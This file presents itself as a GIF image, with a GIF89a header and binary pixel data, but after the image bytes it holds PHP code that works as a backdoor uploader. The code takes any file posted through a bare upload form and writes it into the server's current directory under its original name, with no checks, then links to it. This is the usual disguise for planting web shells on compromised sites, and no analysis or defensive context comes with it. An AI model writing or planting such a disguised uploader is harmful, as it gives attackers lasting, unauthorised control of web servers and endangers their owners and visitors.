GIF89aÑÐ÷ÿ EEEíí ii éé cc ÒÒÒÿÿ½ÂÂÂáá RR õõõÜÜ åå ½½½ZZ ÕÕ %%&JJ BB ÙÙ ÌÌ ÐÐ ±±±33 :: ÉÉ ¬¬­¡¡¡ÄÄ ðððÁÁ üü œœœ++ ½½ ‘‘‘íííúú ññÇ{{{"" ŒŒŒ´´ ºº ©© qqrääå±± ­­ èèèlll¥¥ žž ááá\\\÷÷  þþ–üüüöö ¡¡ •• ™™ ‘‘ ŒŒ bbb€€  >>>ÿÿdÝÝÝ|| †† ÍÍ®òò xx ‰‰ ØØØRRRôô uu ªªƒÈÈÈ ÌÌRúúú222ÍÍÍpp qqKðð ®®1ÏÏiŒŒ2÷÷÷kÆÆ9½½gNN4§§P’’SÛÛçüüãòòUÒÒŽll,ää;¶¶Æêêõ››­ÍÍØŠŠ›¸¸¡­­ºvvˆüü]]jããíLLMÕÕÖóóûÙÙ¹œœtææ––+ÂÂÎ77%ii{ÿÿë77FµµµDD"vvwËË¥¥¦»»&<<úúþýý÷óóó^^:îîâ¹¹¹~~UÙÙ&WWWzz*ûû+,,-&&ÊÊ¿ƒƒ$††‡•••[[ êêë˜˜˜ee ¤¤'ßßì€€ogggûûÿÚÚÛÿÿËËÌÄÄÂÂààÃååŽŽÿÿùll\[[666õõíÎÎ__S¾¾³³NN©©©‘‘ööççÖ::9ééææÐÐ÷÷þjj<?pHp
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
	$pp = getcwd();

    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
  
echo"<center><b>Done ==></b><a href='$userfile_name'>$userfile_name</a></center>";
}
}
else{
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="UPLOAD!"></form>';
}
?> 
